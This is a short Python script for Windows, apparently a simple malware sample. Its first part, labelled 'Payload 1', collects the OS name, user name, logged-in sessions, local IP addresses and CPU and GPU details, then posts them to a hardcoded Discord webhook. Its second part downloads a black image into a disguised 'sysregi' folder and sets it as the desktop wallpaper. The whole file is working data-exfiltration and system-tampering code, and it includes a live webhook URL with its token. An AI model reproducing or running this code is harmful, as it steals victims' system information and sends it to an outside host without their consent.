import os; import psutil
import requests; import platform
import wmi; import ctypes

print("Operating System:", os.name)
print("User Name:", os.getlogin())
print("Username/Password:", psutil.users())
print("CPU:", platform.processor())
print("GPU:")

# Connect WMI to the service 
c = wmi.WMI()

# Get GPU information 
for adapter in c.Win32_VideoController():
    print(adapter.Name)

connections = psutil.net_connections(kind="inet4")

# Extract IP addresses
ip_addresses = [conn.laddr.ip for conn in connections]

# Concatenate the IP addresses as a string
ip_addresses_str = ", ".join(ip_addresses)

# Format the message
message = f"```\nOperating System: {os.name}\nUser Name: {os.getlogin()}\nUsername/Passwords: {psutil.users()}\nNetwork: {ip_addresses_str}\nCPU: {platform.processor()}\nGPU: {adapter.Name}```"

# Set the Discord webhook URL
url = "https://discord.com/api/webhooks/1077742889116901447/cvBOyuZ_IOU4Lnj0_BbguTaCISiy0_WrgnsDY4VqYGlrc5-6t-7g25rahbxAjVdUal2H"

# Set the message payload
payload = {
    "content": message
}

# Send the message to the webhook
response = requests.post(url, json=payload)

# Check if the request was successful
if response.status_code == 204:
    print("\nMessage sent successfully.")
else:
    print("\nError sending message.")

# End Payload 1/ Beginning Payload 2

# Set the path of the new folder 
folder_path = "C:\\%appdata%\\sysregi"

# Create new folder if it doesn't already exist
if not os.path.exists(folder_path):
    os.makedirs(folder_path)

# Set the URL of the image file to use as the desktop background
image_url = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Very_Black_screen.jpg/800px-Very_Black_screen.jpg?20200816082819"

# Set the path to save the downloaded image
image_path = "C:\\sysregi\\image.jpg"

# Download the image from the URL
response = requests.get(image_url)
with open(image_path, "wb") as f:
    f.write(response.content)

# Set the SPI_SETDESKWALLPAPER flag
SPI_SETDESKWALLPAPER = 20

# Call the SystemParametersInfo function to set the desktop wallpaper
ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
